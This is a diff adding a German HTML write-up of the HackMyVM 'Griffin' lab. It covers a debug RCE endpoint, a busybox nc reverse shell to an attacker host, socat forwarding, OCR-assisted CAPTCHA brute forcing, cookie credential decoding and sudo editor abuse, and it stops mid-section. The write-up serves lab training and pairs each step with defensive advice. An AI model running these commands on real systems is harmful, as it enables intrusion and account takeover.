@@ -1,1 +1,393 @@
-﻿<html><body><h1>Test-Inhalt für Cachalot - HackMyVM - Medium.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Griffin - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Griffin - HackMyVM - Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">netcat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">socat</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">python3</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt war die Identifizierung des Ziels im lokalen Netzwerk. Mit `arp-scan` habe ich die IP-Adresse `192.168.2.169` ermittelt. Daraufhin habe ich den Hostnamen `griffin.hmv` in meine `/etc/hosts`-Datei eingetragen, um die weitere Arbeit zu erleichtern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein standardmäßiger und schneller Start in die Aufklärungsphase. Die IP ist bekannt, und die lokale Namensauflösung ist eingerichtet. Das ist die Basis für alle weiteren Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Vorgehen ist bewährt und effizient. Es stellt sicher, dass man sich auf das richtige Ziel konzentriert.<br><strong>Empfehlung (Admin):</strong> ARP-Scans sind im LAN normal. Um nicht autorisierte Scans zu erkennen, können Network Intrusion Detection Systems (NIDS) eingesetzt werden, die auf eine hohe Anzahl von ARP-Anfragen von einer einzelnen Quelle achten.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::::::::::::::: ARP-Scan ::::::::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+ 
+192.168.2.169	08:00:27:bd:00:88	PCS Systemtechnik GmbH 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender `nmap`-Scan wurde durchgeführt, um offene Ports und Dienste zu identifizieren. Der Scan enthüllte zwei offene Ports: Port 22 mit `OpenSSH 8.4p1` und Port 8080 mit einem `Werkzeug httpd 3.1.3` Webserver, der auf `Python 3.9.2` läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche ist klein und klar definiert. Die SSH-Version ist modern und wahrscheinlich nicht direkt angreifbar. Der Fokus liegt daher eindeutig auf dem Python-basierten Webserver auf Port 8080. Werkzeug ist ein gängiges WSGI-Framework für Python, das oft in Verbindung mit Flask oder Django verwendet wird. Dies deutet stark auf eine benutzerdefinierte Webanwendung als primären Angriffsvektor hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gesamte Aufmerksamkeit sollte auf die Webanwendung auf Port 8080 gerichtet werden. Es müssen Verzeichnisse, Parameter und mögliche Schwachstellen wie Command Injection, LFI oder SSTI gesucht werden.<br><strong>Empfehlung (Admin):</strong> Dienste, die nicht benötigt werden, sollten geschlossen sein. Die Angriffsfläche ist hier zwar klein, aber der verbleibende Webserver muss gründlich gesichert sein. Stellen Sie sicher, dass alle Python-Bibliotheken auf dem neuesten Stand sind und die Anwendung selbst keine bekannten Schwachstellen aufweist.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::: Nmap nur offene Ports Ausgabe :::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+<span class="command">8080/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.2Python 3.9.2)</span>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+</pre>
+                </div>
+            </div>
+        </section>
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe `Nikto` auf den Webserver auf Port 8080 losgelassen, um nach bekannten Schwachstellen und interessanten Dateien zu suchen. Nikto meldet das Fehlen üblicher Sicherheits-Header und, was noch wichtiger ist, eine Reihe von potenziell interessanten Backup- und Zertifikatsdateien wie `dump.jks`, `site.tar.lzma`, `archive.tar` und `griffin.egg`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Fund dieser potenziellen Backup-Dateien ist ein bedeutender Hinweis. Auch wenn viele davon nicht existieren mögen, deutet die bloße Möglichkeit darauf hin, dass der Quellcode oder andere sensible Informationen versehentlich offengelegt worden sein könnten. Insbesondere `.egg`-Dateien sind für Python-Anwendungen relevant. Obwohl sich diese Spuren als nicht direkt weiterführend herausstellten, war es wichtig, sie zu überprüfen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Auch wenn diese spezifischen Dateien nicht zum Erfolg führten, ist der Ansatz korrekt. Der nächste Schritt ist, die Verzeichnisstruktur mit einem Brute-Force-Tool wie `wfuzz` oder `feroxbuster` zu durchsuchen, um versteckte Endpunkte zu finden.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine Backup-Dateien, Quellcode-Archive oder Zertifikate im Web-Root-Verzeichnis oder anderen öffentlich zugänglichen Pfaden abgelegt werden. Solche Dateien können sensible Informationen wie API-Schlüssel, Datenbank-Credentials oder die Anwendungslogik selbst preisgeben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://griffin.hmv:8080</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.169
++ Target Hostname:    griffin.hmv
++ Target Port:        8080
+...
++ Server: Werkzeug/3.1.3 Python/3.9.2
+...
+<span class="password">+ /dump.jks: Potentially interesting backup/cert file found.</span>
+<span class="password">+ /site.tar.lzma: Potentially interesting backup/cert file found.</span>
+<span class="password">+ /archive.tar: Potentially interesting backup/cert file found.</span>
+...
+<span class="password">+ /griffin.egg: Potentially interesting backup/cert file found.</span>
+...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche die Webanwendung manuell mit `curl`. Ein einfacher GET-Request auf die Hauptseite liefert einen thematischen Text. Ein Versuch, einen anderen Endpunkt wie `/console` zu erraten, führt zur selben Seite. Ein Request auf `/debug` liefert jedoch eine andere Antwort: "Missing token parameter". Dies ist ein starker Hinweis auf einen versteckten Debug-Endpunkt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Fund des `/debug`-Endpunkts ist ein entscheidender Fortschritt. Debug-Funktionen sind oft fehleranfällig und können unbeabsichtigte Funktionalitäten wie Code-Ausführung oder Informationslecks enthalten. Die Fehlermeldung "Missing token parameter" bedeutet, dass ich einen Weg finden muss, ein gültiges Token zu erhalten, um diese Funktion nutzen zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich muss nach einem Weg suchen, das erforderliche Token zu finden. Ich werde die Anwendung weiter nach anderen versteckten Endpunkten durchsuchen, die möglicherweise das Token preisgeben.<br><strong>Empfehlung (Admin):</strong> Debug-Endpunkte dürfen niemals in einer produktiven Umgebung erreichbar sein. Wenn sie für Entwicklungszwecke benötigt werden, müssen sie durch strikte Zugriffskontrollen (z. B. Authentifizierung und Beschränkung auf bestimmte IP-Adressen) geschützt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X GET http://192.168.2.169:8080/debug</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Missing token parameter
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `wfuzz`, um die Webanwendung weiter zu durchsuchen. Ein Brute-Force-Angriff auf Verzeichnisse und Dateien mit einer gängigen Wortliste enthüllt den Endpunkt `/info`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der zweite entscheidende Fund. Nachdem ich einen `/debug`-Endpunkt gefunden habe, der ein Token benötigt, finde ich nun einen `/info`-Endpunkt. Es ist sehr wahrscheinlich, dass dieser Endpunkt die benötigten Informationen liefert. Ein `curl`-Request an `/info` bestätigt dies sofort: "System Info: Diagnostic token = CyberCorpDebug123".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Plan ist klar: Ich werde den gefundenen Token (`CyberCorpDebug123`) mit dem `/debug`-Endpunkt verwenden und sehen, was passiert. Ich erwarte, dass dies eine neue Funktionalität freischaltet.<br><strong>Empfehlung (Admin):</strong> Informations-Endpunkte, die sensible Daten wie Debug-Token preisgeben, müssen ordnungsgemäß gesichert werden. Informationen sollten niemals unauthentifiziert preisgegeben werden. Die Segmentierung von Funktionalitäten (z. B. Info- und Debug-Seiten) hilft wenig, wenn beide öffentlich zugänglich sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.2.169:8080/FUZZ --hh 160 --hc 404</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                      
+=====================================================================
+
+<span class="password">000000085:   200        0 L      6 W        49 Ch       "info"</span>                       
+...
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X GET http://192.168.2.169:8080/info</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+System Info: Diagnostic token = <span class="password">CyberCorpDebug123</span>
+</pre>
+                </div>
+            </div>
+        </section>
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ich kombiniere nun meine beiden Funde. Ich sende eine Anfrage an den `/debug`-Endpunkt und übergebe das gefundene Token als URL-Parameter: `?token=CyberCorpDebug123`. Die Antwort ist "Missing run command".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Besser geht es kaum! Die Anwendung erwartet explizit einen auszuführenden Befehl. Dies ist eine klassische Remote Code Execution (RCE) Schwachstelle. Ich füge den `run`-Parameter hinzu und teste mit dem `id`-Befehl. Nach korrektem Quoting der URL funktioniert es: `uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)`. Ich habe RCE als Benutzer `lois` erlangt, der zusätzlich zur Gruppe `root` gehört – eine massive Fehlkonfiguration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist, diese RCE zu nutzen, um eine interaktive Reverse Shell zu erhalten. Ich werde die Verfügbarkeit von Tools wie `netcat` oder `busybox` auf dem Zielsystem prüfen und einen entsprechenden Payload konstruieren.<br><strong>Empfehlung (Admin):</strong> Eine Webanwendung, die einen Parameter zur direkten Ausführung von Systembefehlen entgegennimmt, ist eine kritische Schwachstelle der höchsten Stufe. Solche Funktionen sind extrem gefährlich und dürfen in keiner Webanwendung existieren. Jede Benutzereingabe muss als nicht vertrauenswürdig behandelt und darf niemals direkt an eine Shell übergeben werden. Zudem ist die Mitgliedschaft eines normalen Benutzers (`lois`) in der `root`-Gruppe eine schwere Verletzung des Prinzips der geringsten Rechte.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.169:8080/debug?token=CyberCorpDebug123</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Missing run command
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X GET "http://192.168.2.169:8080/debug?token=CyberCorpDebug123&run=id"</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+<span class="password">uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich die RCE bestätigt habe, konstruiere ich einen Reverse-Shell-Payload. Eine Überprüfung zeigt, dass `netcat` nicht direkt verfügbar ist, aber `busybox` ist installiert. Ich verwende daher `busybox nc`, um eine Verbindung zu meinem Listener auf Port 4444 aufzubauen und eine Shell (`/bin/sh`) bereitzustellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich. Mein `netcat`-Listener empfängt die Verbindung, und ich habe eine interaktive Shell als Benutzer `lois` auf dem System. Der initiale Zugriff ist geschafft. Interessanterweise lande ich im `/root`-Verzeichnis, habe dort aber keine Leserechte, obwohl ich Mitglied der `root`-Gruppe bin. Dies deutet auf eine ungewöhnliche Berechtigungskonfiguration hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die erste Priorität ist die Stabilisierung der Shell. Danach beginnt die interne Enumeration, um einen Weg zur vollständigen `root`-Eskalation zu finden. Ich werde die `sudo`-Berechtigungen überprüfen und die Home-Verzeichnisse anderer Benutzer untersuchen.<br><strong>Empfehlung (Admin):</strong> Dies demonstriert, wie eine RCE zur vollständigen Übernahme einer Shell führt. Egress-Filtering (das Blockieren ausgehender Verbindungen) auf dem Server hätte diesen Reverse-Shell-Versuch verhindern oder zumindest erschweren können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X GET "http://192.168.2.169:8080/debug?token=CyberCorpDebug123&run=/usr/bin/busybox%20nc%20192.168.2.199%204444%20-e%20/bin/sh"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.169] 37376</span>
+<span class="password">lois@Griffin:~$</span> id
+uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
+</pre>
+                </div>
+            </div>
+        </section>
+    </div>
+
+ 
+
+ 
+    <div class="container">
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich als Benutzer `lois` Zugriff auf das System erlangt habe, beginne ich mit der internen Enumeration. Ich finde die `user.txt` in Lois' Home-Verzeichnis und kann sie direkt lesen. Anschließend überprüfe ich die `sudo`-Berechtigungen mit `sudo -l`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag ist schnell gesichert. Die `sudo -l`-Ausgabe enthüllt einen klaren Weg für die Privilegienerweiterung: Der Benutzer `lois` darf den Befehl `/usr/bin/cat /root/startup.log` mit `root`-Rechten und ohne Passwort ausführen. Dies bedeutet, ich kann den Inhalt dieser spezifischen Log-Datei im `root`-Verzeichnis lesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste logische Schritt ist, diese `sudo`-Regel auszunutzen und den Inhalt von `/root/startup.log` zu lesen. Ich erwarte, darin sensible Informationen wie Passwörter oder Hinweise auf weitere Schwachstellen zu finden.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regeln, die das Lesen von Dateien als `root` erlauben, müssen mit äußerster Vorsicht behandelt werden. Auch wenn es sich "nur" um eine Log-Datei handelt, können solche Dateien kritische Informationen enthalten. Der Zugriff sollte nur gewährt werden, wenn es absolut notwendig ist, und die Log-Dateien sollten regelmäßig auf sensible Einträge überprüft werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">lois@Griffin:/home/lois$ <span class="command">cat user.txt</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+<span class="password">flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">lois@Griffin:/home/lois$ <span class="command">sudo -l</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Matching Defaults entries for lois on Griffin:    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User lois may run the following commands on Griffin:
+    <span class="password">(ALL) NOPASSWD: /usr/bin/cat /root/startup.log</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Bevor ich die Eskalation fortsetze, stabilisiere ich meinen Zugriff. Ich erstelle ein neues SSH-Schlüsselpaar und füge meinen öffentlichen Schlüssel zur `authorized_keys`-Datei im `.ssh`-Verzeichnis des `lois`-Benutzers hinzu. Dies ermöglicht mir einen direkten SSH-Login ohne auf die instabile Reverse-Shell angewiesen zu sein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Wechsel zu einer vollwertigen SSH-Session ist ein entscheidender Schritt für die Effizienz und Stabilität der weiteren Arbeit. Es macht die Enumeration und die Ausführung von Befehlen wesentlich einfacher und zuverlässiger.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Etabliere immer eine stabile und persistente Zugriffsmethode, sobald es möglich ist. SSH-Zugriff ist einer Reverse Shell fast immer vorzuziehen.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die `authorized_keys`-Dateien der Benutzer. Das plötzliche Hinzufügen neuer Schlüssel kann ein Indikator für eine Kompromittierung sein. File Integrity Monitoring (FIM)-Systeme können solche Änderungen erkennen und melden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh lois@griffin.hmv -i .ssh/id_rsa</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Enter passphrase for key '.ssh/id_rsa': 
+Linux Griffin 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+...
+lois@Griffin:~$ 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit meiner stabilen Shell als `lois` entdecke ich durch einen `ss`-Befehl einen internen Dienst, der auf Port 80 nur auf `localhost` (127.0.0.1) lauscht. Um diesen von meiner Angreifer-Maschine aus zu erreichen, nutze ich `socat` auf dem Zielsystem, um den internen Port 80 auf einen extern zugänglichen Port (8001) weiterzuleiten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Port-Forwarding ist erfolgreich. Ich kann nun auf den versteckten Apache-Webserver zugreifen. Ein `feroxbuster`-Scan auf diesen neuen Endpunkt findet ein Verzeichnis `/family/` mit einer `index.php`, einer `captcha.php` und einer `admin.php`. Die `robots.txt` enthält einen auffälligen Hinweis auf die `rockyou`-Wortliste.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Hinweis in der `robots.txt` ist eine klare Aufforderung, einen Brute-Force-Angriff auf die gefundene Login-Seite im `/family`-Verzeichnis zu starten. Die `captcha.php` stellt dabei die größte Herausforderung dar, die es zu überwinden gilt.<br><strong>Empfehlung (Admin):</strong> Versteckte oder interne Web-Panels müssen genauso robust abgesichert werden wie externe. Der Hinweis in der `robots.txt` ist ein unnötiges Informationsleck, das Angreifern direkt den nächsten Schritt vorgibt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">lois@Griffin:~$ <span class="command">/usr/bin/socat TCP-LISTEN:8001,reuseaddr,fork TCP:127.0.0.1:80 &</span></div>
+                </div>
+            </div>
+            <img src="socat_webside.jpg" alt="hier sieht man eine Webapplication die ich mit socat forwardet habe vom griffin Netzwerk Port 80">
+            <img src="family_captcha.jpg" alt="hier sieht man eine loginseite mit captcha eingabefeld, username und passwort">
+            <img src="captcha.jpg" alt="hier sieht man eine captcha.php seite die captchas in png's generiert bei jedem reload">
+            <p class="analysis"><strong>Analyse:</strong> Um das CAPTCHA-geschützte Login anzugreifen, klone ich ein Python-Skript von GitHub (`CAPTCHA-Login-bruteforce`), das speziell für solche Szenarien entwickelt wurde. Es verwendet die OCR-Bibliothek `ddddocr`, um die CAPTCHAs automatisch zu lesen. Während der Einrichtung stoße ich auf ein Problem mit einer veralteten Funktion in der `ddddocr`-Bibliothek. Ich muss die Datei `__init__.py` manuell bearbeiten und `Image.ANTIALIAS` durch das neuere `Image.LANCZOS` ersetzen, damit das Skript funktioniert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Anpassungsfähigkeit ist hier der Schlüssel. Anstatt aufzugeben, habe ich das Problem im Code der Bibliothek identifiziert und behoben. Nach der Korrektur starte ich den Brute-Force-Angriff. Das Skript löst erfolgreich die CAPTCHAs und testet Passwörter aus der `rockyou.txt`-Liste. Es identifiziert `savannah` als korrektes Passwort, als die Webseite mit einem HTTP-Status 302 (Redirect) antwortet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit dem gefundenen Passwort (`savannah`) und einem Benutzernamen, der zum Thema passt (in diesem Fall `brian`), kann ich mich manuell einloggen, um die Session zu analysieren und den nächsten Schritt zu planen.<br><strong>Empfehlung (Admin):</strong> CAPTCHA-Systeme müssen robust genug sein, um modernen OCR-Tools standzuhalten. Dies kann durch komplexere Verzerrungen, Hintergründe oder interaktive CAPTCHAs (wie reCAPTCHA) erreicht werden. Die Abhängigkeit von einem einfachen Bild-CAPTCHA ist oft unzureichend.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">git clone https://github.com/StrongShiv8/CAPTCHA-Login-bruteforce.git</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(venv)─(root㉿CCat)-[~/Hackingtools/CAPTCHA-Login-bruteforce]
+└─# <span class="command">python3 brute_family.py /usr/share/wordlists/rockyou.txt</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+[00152] george | captcha=8K5N | status=200
+[00153] savannah | captcha=WAUX | <span class="password">status=302</span>
+
+<span class="password">🎉 FOUND: savannah</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem erfolgreichen Login mit `brian:savannah` fange ich die Antwort des Servers mit Burp Suite ab. Die Antwort enthält ein `Set-Cookie`-Header für ein `auth_token`. Das Token `9xyr8Ay3ohk8o97mHD8X4aAZf9BTkQZWc` sieht kodiert aus. Ich verwende CyberChef, um es zu analysieren, und stelle fest, dass eine Base58-Dekodierung gefolgt von einer Base64-Dekodierung die Klartext-Anmeldeinformationen `meg:lovelyfamily` enthüllt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine kritische Sicherheitslücke. Sensible Daten (Anmeldeinformationen) werden direkt im Cookie gespeichert, nur durch eine einfache Kodierung verschleiert. Ich habe nun einen neuen Satz von Credentials für den Benutzer `meg`. Ich melde mich sofort per SSH mit `meg:lovelyfamily` an.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit dem neuen Benutzerzugang als `meg` muss der Enumerationsprozess wiederholt werden: Überprüfe die `sudo`-Rechte, suche nach interessanten Dateien und plane den nächsten Schritt zur Root-Eskalation.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Klartext-Credentials oder andere sensible Daten in Cookies, auch nicht kodiert. Kodierung ist keine Verschlüsselung. Session-Token sollten zufällig generierte, serverseitig validierte Werte sein, die keine Informationen über den Benutzer preisgeben.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+auth_token=9xyr8Ay3ohk8o97mHD8X4aAZf9BTkQZWc;
+--[CyberChef]-->
+<span class="password">meg:lovelyfamily</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `meg` überprüfe ich die `sudo`-Berechtigungen. `meg` darf das Python-Skript `/root/game.py` als `root` ohne Passwort ausführen. Ich starte das Skript und sehe, dass es ein Challenge-Response-Spiel auf Port 6666 startet. Ich habe ein separates Python-Skript entwickelt, um die mehrstufige Challenge (Mathe, Caesar-Chiffre, MD5) automatisch zu lösen. Dies gibt mir eine Flag, aber es ist nicht die Root-Flag.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das `game.py`-Skript ist eine komplexe falsche Fährte ("Red Herring"). Obwohl es eine `sudo`-Regel und eine interaktive Herausforderung gibt, führt es nicht zum Ziel. Aus der `/root/startup.log`, die ich zuvor als `lois` lesen konnte, habe ich das Passwort für den Benutzer `peter` erfahren. Dies ist der eigentliche Weg. Ich wechsle mit `su peter` die Identität.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lassen Sie sich nicht von aufwändigen falschen Fährten ablenken. Wenn ein Weg nicht zur Eskalation führt, kehren Sie zu den gesammelten Informationen zurück und bewerten Sie andere potenzielle Pfade neu. Die Information aus der Log-Datei ist hier der Schlüssel.<br><strong>Empfehlung (Admin):</strong> Die `sudo`-Regel für `game.py` ist extrem gefährlich. Selbst wenn es als Spiel gedacht war, könnte ein Angreifer versuchen, Schwachstellen im Python-Skript selbst zu finden (z.B. durch Injektionen in die Eingaben), um `root`-Code auszuführen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">meg@Griffin:~$ <span class="command">sudo -l</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+User meg may run the following commands on Griffin:
+    <span class="password">(ALL) NOPASSWD: /usr/bin/python3 /root/game.py</span>
+</pre>
+                </div>
+            </div>
+        </section>
+        <section id="proof-of-concept">
+            <h2>Proof of Concept</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `peter` überprüfe ich erneut die `sudo`-Berechtigungen. Die Ausgabe von `sudo -l` zeigt, dass `peter` den minimalistischen Texteditor `mg` auf jede beliebige Datei als `root` ohne Passwort ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der finale und entscheidende Angriffsvektor. Viele einfache Texteditoren, die über `sudo` ausgeführt werden, bieten eine Möglichkeit, zu einer Shell auszubrechen oder Befehle auszuführen. Ich kann diese Berechtigung nutzen, um die `/etc/sudoers`-Datei zu bearbeiten und mir selbst volle `root`-Rechte zu geben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Plan ist, `sudo /usr/bin/mg /etc/sudoers` auszuführen, die Zeile `peter ALL=(ALL:ALL) ALL` hinzuzufügen, die Datei zu speichern und dann mit `sudo su` eine `root`-Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Geben Sie Benutzern niemals `sudo`-Rechte für Texteditoren, insbesondere nicht für unkritische Dateien wie `/etc/sudoers`. Verwenden Sie `visudo` für die Bearbeitung dieser Datei. Wenn ein Benutzer eine Datei mit erhöhten Rechten bearbeiten muss, ist `sudoedit` die sicherere Wahl, da es in einer temporären Datei arbeitet und die Berechtigungen des Benutzers beibehält.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">peter@Griffin:/home/meg$ <span class="command">sudo -l</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Matching Defaults entries for peter on Griffin:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User peter may run the following commands on Griffin:
+    <span class="password">(ALL) NOPASSWD: /usr/bin/mg</span>
+</pre>
+                </div>
